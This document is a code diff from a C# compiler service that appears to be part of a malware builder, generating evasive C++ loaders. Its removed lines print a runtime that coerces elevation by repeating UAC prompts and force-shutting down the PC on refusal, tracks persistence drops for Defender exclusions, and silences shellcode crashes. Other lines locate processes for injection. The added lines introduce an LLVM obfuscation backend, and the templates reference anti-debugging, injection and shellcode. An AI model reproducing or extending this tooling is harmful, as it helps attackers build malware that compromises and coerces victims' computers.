@@ -23,288 +23,6 @@ public interface ICompilerService
 /// </summary>
 public sealed class CompilerService : ICompilerService
 {
-    private const string ProcessLookupHelper = """
-#define WIN32_LEAN_AND_MEAN
-#include <windows.h>
-#include <tlhelp32.h>
-#include <string>
-#include <algorithm>
-
-DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId)
-{
-    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snapshot == INVALID_HANDLE_VALUE)
-        return 0;
-
-    PROCESSENTRY32W entry{};
-    entry.dwSize = sizeof(entry);
-
-    DWORD result = 0;
-
-    if (Process32FirstW(snapshot, &entry))
-    {
-        do
-        {
-            std::wstring exe = entry.szExeFile;
-            std::wstring exeLower = exe;
-            std::wstring targetLower = processName;
-            std::transform(exeLower.begin(), exeLower.end(), exeLower.begin(), ::towlower);
-            std::transform(targetLower.begin(), targetLower.end(), targetLower.begin(), ::towlower);
-
-            if (exeLower == targetLower)
-            {
-                if (returnProcessId)
-                {
-                    result = entry.th32ProcessID;
-                }
-                else
-                {
-                    HANDLE threadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-                    if (threadSnapshot != INVALID_HANDLE_VALUE)
-                    {
-                        THREADENTRY32 threadEntry{};
-                        threadEntry.dwSize = sizeof(threadEntry);
-                        if (Thread32First(threadSnapshot, &threadEntry))
-                        {
-                            do
-                            {
-                                if (threadEntry.th32OwnerProcessID == entry.th32ProcessID)
-                                {
-                                    result = threadEntry.th32ThreadID;
-                                    break;
-                                }
-                            } while (Thread32Next(threadSnapshot, &threadEntry));
-                        }
-
-                        CloseHandle(threadSnapshot);
-                    }
-                }
-
-                break;
-            }
-        } while (Process32NextW(snapshot, &entry));
-    }
-
-    CloseHandle(snapshot);
-    return result;
-}
-""";
-
-    private const string SharedPreamble = """
-#include <shellapi.h>
-#pragma comment(lib, "shell32.lib")
-#pragma comment(lib, "advapi32.lib")
-
-// Shared washmachine runtime: persistence-drop tracker + UAC helpers.
-// All persistence snippets call wash_track(path) for every dropped copy of the
-// running executable. The Evasion DefenderExclusion snippet iterates wash_copies[]
-// to register every drop with Add-MpPreference. wash_track_self() is invoked
-// automatically before main() via a static initializer so the running path is
-// always present even when no persistence snippet ran.
-static const size_t WASH_COPIES_MAX = 32;
-static wchar_t wash_copies[WASH_COPIES_MAX][MAX_PATH];
-static int wash_copies_count = 0;
-
-static void wash_track(const wchar_t* path)
-{
-    if (!path || wash_copies_count >= (int)WASH_COPIES_MAX)
-        return;
-
-    size_t len = wcslen(path);
-    if (len == 0 || len >= MAX_PATH)
-        return;
-
-    // Skip duplicates so the same path is not registered twice.
-    for (int i = 0; i < wash_copies_count; i++)
-        if (_wcsicmp(wash_copies[i], path) == 0)
-            return;
-
-    wcscpy_s(wash_copies[wash_copies_count], MAX_PATH, path);
-    wash_copies_count++;
-}
-
-static void wash_track_self(void)
-{
-    wchar_t self[MAX_PATH] = {0};
-    if (GetModuleFileNameW(NULL, self, MAX_PATH) > 0)
-        wash_track(self);
-}
-
-static BOOL wash_is_elevated(void)
-{
-    BOOL elevated = FALSE;
-    HANDLE token = NULL;
-
-    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE, &token))
-    {
-        TOKEN_ELEVATION elevation = {0};
-        DWORD size = sizeof(elevation);
-
-        if (GetTokenInformation(token, TokenElevation, &elevation, size, &size))
-            elevated = elevation.TokenIsElevated;
-
-        // Fallback for SYSTEM and non-split-token accounts where TokenIsElevated
-        // may be reported as 0 despite full admin group membership.
-        if (!elevated)
-        {
-            HANDLE impToken = NULL;
-            if (DuplicateToken(token, SecurityImpersonation, &impToken))
-            {
-                PSID adminSid = NULL;
-                SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
-                if (AllocateAndInitializeSid(&ntAuth, 2,
-                        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
-                        0, 0, 0, 0, 0, 0, &adminSid))
-                {
-                    CheckTokenMembership(impToken, adminSid, &elevated);
-                    FreeSid(adminSid);
-                }
-                CloseHandle(impToken);
-            }
-        }
-
-        CloseHandle(token);
-    }
-
-    return elevated;
-}
-
-// Best-effort forced shutdown when the operator refuses to elevate. Tries the
-// privileged ExitWindowsEx path first (after enabling SE_SHUTDOWN_NAME), then
-// falls back to spawning shutdown.exe which works under the regular user
-// "Shut down the system" right that is granted by default.
-static void wash_force_shutdown(void)
-{
-    HANDLE token = NULL;
-    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
-    {
-        TOKEN_PRIVILEGES tp = {0};
-        if (LookupPrivilegeValueW(NULL, L"SeShutdownPrivilege", &tp.Privileges[0].Luid))
-        {
-            tp.PrivilegeCount = 1;
-            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-            AdjustTokenPrivileges(token, FALSE, &tp, 0, NULL, NULL);
-        }
-        CloseHandle(token);
-    }
-
-    ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE | EWX_FORCEIFHUNG, 0);
-
-    // Fallback: invoke shutdown.exe directly. Default user policy permits this.
-    wchar_t cmd[] = L"shutdown.exe /s /t 0 /f";
-    STARTUPINFOW si = { sizeof(si) };
-    PROCESS_INFORMATION pi = { 0 };
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
-    {
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    }
-
-    ExitProcess(1);
-}
-
-// Spam-loop UAC: re-launches the current binary with the "runas" verb until the
-// user accepts. maxDenials == 0 means loop forever. Any positive value triggers
-// wash_force_shutdown() once exceeded, satisfying "say yes or shutdown the PC".
-// retryMs is the back-off between dialog dismissals; defaults to 300ms when 0.
-static void wash_demand_elevation_or_shutdown(DWORD maxDenials, DWORD retryMs)
-{
-    if (wash_is_elevated())
-        return;
-
-    // In Session 0 (services, scheduled tasks running as SYSTEM) there is no
-    // interactive desktop — ShellExecuteW("runas") cannot show a UAC dialog and
-    // would silently fail, creating an infinite spin-loop. Skip the UAC dance.
-    DWORD _wash_sessionId = 0;
-    ProcessIdToSessionId(GetCurrentProcessId(), &_wash_sessionId);
-    if (_wash_sessionId == 0)
-        return;
-
-    if (retryMs == 0)
-        retryMs = 300;
-
-    wchar_t modulePath[MAX_PATH] = {0};
-    GetModuleFileNameW(NULL, modulePath, MAX_PATH);
-
-    DWORD denials = 0;
-    while (!wash_is_elevated())
-    {
-        HINSTANCE result = ShellExecuteW(NULL, L"runas", modulePath, NULL, NULL, SW_SHOW);
-
-        if ((INT_PTR)result <= 32)
-        {
-            // SE_ERR_ACCESSDENIED (5) or SE_ERR_NOASSOC: user dismissed the prompt.
-            denials++;
-            if (maxDenials != 0 && denials >= maxDenials)
-            {
-                wash_force_shutdown();
-                return; // not reached
-            }
-            Sleep(retryMs);
-            continue;
-        }
-
-        // Elevated copy started successfully; current process can exit.
-        ExitProcess(0);
-    }
-}
-
-// Backwards-compatible: loop forever until elevation is granted.
-static void wash_demand_elevation(void)
-{
-    wash_demand_elevation_or_shutdown(0, 300);
-}
-
-// Returns TRUE the first time this binary is launched; FALSE if another instance
-// is already running. Uses a session-local named mutex derived from the module path
-// so rename/move creates a separate lock identity.
-static BOOL wash_single_instance(void)
-{
-    wchar_t self[MAX_PATH] = {0};
-    wchar_t mutexName[64]  = {0};
-    GetModuleFileNameW(NULL, self, MAX_PATH);
-    DWORD hash = 2166136261u;
-    for (int i = 0; self[i]; i++)
-        hash = (hash ^ (DWORD)self[i]) * 16777619u;
-    wsprintfW(mutexName, L"Local\\wash_%08X", hash);
-    HANDLE h = CreateMutexW(NULL, TRUE, mutexName);
-    if (h == NULL)
-        return TRUE; // creation failed; allow run rather than silently exit
-    return GetLastError() != ERROR_ALREADY_EXISTS;
-}
-
-// Vectored exception handler: catches hardware faults thrown by shellcode and
-// exits cleanly instead of producing a WER crash dialog or memory dump.
-static LONG WINAPI _wash_veh(PEXCEPTION_POINTERS ep)
-{
-    DWORD code = ep->ExceptionRecord->ExceptionCode;
-    if (code == EXCEPTION_ACCESS_VIOLATION    ||
-        code == EXCEPTION_ILLEGAL_INSTRUCTION ||
-        code == EXCEPTION_STACK_OVERFLOW      ||
-        code == EXCEPTION_PRIV_INSTRUCTION    ||
-        code == EXCEPTION_INT_DIVIDE_BY_ZERO)
-    {
-        ExitProcess(0);
-    }
-    return EXCEPTION_CONTINUE_SEARCH;
-}
-
-// File-scope object whose constructor runs before main() and registers the
-// running executable path in wash_copies[]. Removes the need for snippets to
-// call wash_track_self() explicitly.
-struct __wash_self_track_init
-{
-    __wash_self_track_init()
-    {
-        wash_track_self();
-        if (!wash_single_instance()) ExitProcess(0);
-        AddVectoredExceptionHandler(0, _wash_veh);
-    }
-};
-static __wash_self_track_init __wash_self_track_init_instance;
-""";
 
     private const string TemplateAntiDebug = "ANTIDEBUGGING";
     private const string TemplateProcessInjection = "PSINJECTION";
@@ -314,16 +32,8 @@ static __wash_self_track_init __wash_self_track_init_instance;
     private const string GenericShellcodeTemplatePlaceholder = "GENERICSHELLCODE";
     private const string TemplateGuardrail = "GUARDRAIL";
 
-    /// <summary>
-    /// Maps a <c>requires:</c> capability token (declared on a snippet item in
-    /// the YAML catalog) to the snippet section template it depends on.
-    /// Currently only <c>uac_bypass</c> is wired; other tokens are reserved.
-    /// </summary>
-    private static readonly Dictionary<string, string> RequiresTokenToSectionTemplate =
-        new(StringComparer.OrdinalIgnoreCase)
-        {
-            ["uac_bypass"] = TemplateUacBypass,
-        };
+    private static readonly IReadOnlyDictionary<string, string> RequiresTokenToSectionTemplate =
+        KnownRequiresTokens.Map;
 
     private const string StubSelectionId = "None";
 
@@ -418,6 +128,12 @@ static __wash_self_track_init __wash_self_track_init_instance;
     private readonly ICompilerToolLocator _toolLocator;
     private readonly IAppLogger _logger;
 
+    // Loader runtime headers shipped under Assets/runtime/. Read lazily on the
+    // first compile so a fresh process pays the disk hit once, but a path that
+    // never reaches RenderTemplate (e.g. ValidateEnvironment failure) doesn't.
+    private readonly Lazy<string> _sharedPreamble;
+    private readonly Lazy<string> _processLookupHelper;
+
     public CompilerService(
         IAppPaths paths,
         IBin2ShellRunner bin2ShellRunner,
@@ -430,6 +146,18 @@ static __wash_self_track_init __wash_self_track_init_instance;
         _snippets = snippets ?? throw new ArgumentNullException(nameof(snippets));
         _toolLocator = toolLocator ?? throw new ArgumentNullException(nameof(toolLocator));
         _logger = logger ?? throw new ArgumentNullException(nameof(logger));
+
+        _sharedPreamble = new Lazy<string>(() => LoadRuntimeHeader(_paths.RuntimeHeaderFile));
+        _processLookupHelper = new Lazy<string>(() => LoadRuntimeHeader(_paths.ProcessLookupHeaderFile));
+    }
+
+    private static string LoadRuntimeHeader(string path)
+    {
+        if (!File.Exists(path))
+            throw new FileNotFoundException(
+                $"Required runtime header is missing. Reinstall Assets or check your distribution.",
+                path);
+        return File.ReadAllText(path);
     }
 
     public async Task<CompilerResult> CompileAsync(UiData data, CancellationToken cancellationToken = default)
@@ -492,9 +220,22 @@ static __wash_self_track_init __wash_self_track_init_instance;
             notes.Add("Compiling...");
             log.Info("Compiling...");
 
-            var compilerDirectory = ResolveCompilerDirectory(discovery);
             var buildDir = Path.Combine(sessionDir, "build");
-            var conversionResult = await ExecuteConversionAsync(sourcePath, compilerDirectory, buildDir, notes, log, cancellationToken).ConfigureAwait(false);
+            var backend = ResolveCompilationBackend(data);
+            CppFileConversionResult conversionResult;
+
+            if (backend == Models.CompilationBackend.LlvmObfuscated)
+            {
+                log.Info("LLVM obfuscation backend selected.");
+                notes.Add("Compilation backend: LLVM obfuscated.");
+                conversionResult = await ExecuteLlvmConversionAsync(sourcePath, buildDir, data, discovery, notes, log, cancellationToken).ConfigureAwait(false);
+            }
+            else
+            {
+                notes.Add("Compilation backend: deterministic.");
+                var compilerDirectory = ResolveCompilerDirectory(discovery);
+                conversionResult = await ExecuteConversionAsync(sourcePath, compilerDirectory, buildDir, notes, log, cancellationToken).ConfigureAwait(false);
+            }
 
             // Save compiler stdout/stderr to session/build/
             SaveCompilerOutput(sessionDir, conversionResult, log);
@@ -1383,6 +1124,94 @@ static __wash_self_track_init __wash_self_track_init_instance;
         }
     }
 
+    private static Models.CompilationBackend ResolveCompilationBackend(UiData data)
+    {
+        if (data.ComboBoxes.TryGetValue(UiDataKeys.CompilationBackend, out var raw) &&
+            !string.IsNullOrWhiteSpace(raw) &&
+            Enum.TryParse<Models.CompilationBackend>(raw.Trim(), ignoreCase: true, out var parsed))
+        {
+            return parsed;
+        }
+        return Models.CompilationBackend.Deterministic;
+    }
+
+    private async Task<CppFileConversionResult> ExecuteLlvmConversionAsync(
+        string sourcePath,
+        string buildDirectory,
+        UiData data,
+        CompilerToolDiscoveryResult? discovery,
+        ICollection<string> notes,
+        IAppLogger logger,
+        CancellationToken cancellationToken)
+    {
+        var sourceDir = Path.GetDirectoryName(sourcePath);
+        if (string.IsNullOrWhiteSpace(sourceDir))
+        {
+            const string msg = "LLVM: Unable to determine source directory.";
+            notes.Add(msg);
+            logger.Error(msg);
+            return new CppFileConversionResult(false, msg);
+        }
+
+        var llvmBin = _paths.LlvmBinDirectory;
+        if (!Directory.Exists(llvmBin))
+        {
+            var msg = $"LLVM: Bundled LLVM not found at '{llvmBin}'. " +
+                      "Ensure Tools\\LLVM\\bin\\ is present (copy from LLVM installation).";
+            notes.Add(msg);
+            logger.Error(msg);
+            return new CppFileConversionResult(false, msg);
+        }
+
+        // Resolve enabled passes
+        IReadOnlyList<string> requestedPassIds = Array.Empty<string>();
+        if (data.ListBoxes.TryGetValue(UiDataKeys.LlvmObfuscationPasses, out var passList) && passList is { Count: > 0 })
+            requestedPassIds = passList;
+
+        var registry = new LlvmPassRegistry(_paths, logger);
+        var enabledPasses = requestedPassIds.Count > 0
+            ? registry.ResolveEnabledPasses(requestedPassIds)
+            : Array.Empty<LlvmPassDefinition>();
+
+        notes.Add($"LLVM passes requested: {(requestedPassIds.Count == 0 ? "none" : string.Join(", ", requestedPassIds))}");
+        if (enabledPasses.Count > 0)
+            notes.Add($"LLVM passes loaded: {string.Join(", ", enabledPasses.Select(p => p.Name))}");
+
+        try
+        {
+            var result = await LlvmPipelineService.CompileAsync(
+                sourceDir, llvmBin, buildDirectory, enabledPasses, discovery, logger, cancellationToken)
+                .ConfigureAwait(false);
+
+            if (result.Success)
+            {
+                notes.Add("LLVM compilation completed.");
+                logger.Debug("LlvmPipelineService completed successfully.");
+            }
+            else
+            {
+                var errorMessage = string.IsNullOrWhiteSpace(result.Error)
+                    ? "LLVM compilation reported an unspecified error."
+                    : result.Error!;
+                notes.Add(errorMessage);
+                logger.Warn(errorMessage);
+            }
+
+            return result;
+        }
+        catch (OperationCanceledException)
+        {
+            throw;
+        }
+        catch (Exception ex)
+        {
+            var message = $"LLVM pipeline failed with exception: {ex.Message}";
+            notes.Add(message);
+            logger.Error(message);
+            return new CppFileConversionResult(false, ex.Message);
+        }
+    }
+
     private void SaveSessionSettings(string? sessionDir, UiData data, IAppLogger logger)
     {
         if (string.IsNullOrWhiteSpace(sessionDir))
@@ -1931,7 +1760,7 @@ static __wash_self_track_init __wash_self_track_init_instance;
         snippet = snippet.Replace("$psname$", trimmedName);
 
         plan.ProcessInjectionSnippet = snippet;
-        plan.ProcessLookupHelper = ProcessLookupHelper;
+        plan.ProcessLookupHelper = _processLookupHelper.Value;
         AddCustomSnippet(plan, placeholderName, snippet);
 
         LogSnippetEnabled(section.Template, selection.Id, notes);
@@ -2140,7 +1969,7 @@ static __wash_self_track_init __wash_self_track_init_instance;
         return rendered;
     }
 
-    private static Dictionary<string, string> BuildPlaceholderValues(CppCompilationPlan plan, CodeTemplateDefinition template)
+    private Dictionary<string, string> BuildPlaceholderValues(CppCompilationPlan plan, CodeTemplateDefinition template)
     {
         // Map template placeholders to generated snippet blocks.
         var values = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
@@ -2156,7 +1985,7 @@ static __wash_self_track_init __wash_self_track_init_instance;
         }
 
         // Shared preamble (path tracking, UAC helpers) - always injected.
-        AddPlaceholder(values, PlaceholderPreamble, SharedPreamble, overwrite: true);
+        AddPlaceholder(values, PlaceholderPreamble, _sharedPreamble.Value, overwrite: true);
         
         // Template preamble (shared type definitions, helper functions) - appended to shared preamble.
         if (!string.IsNullOrWhiteSpace(template.Preamble))
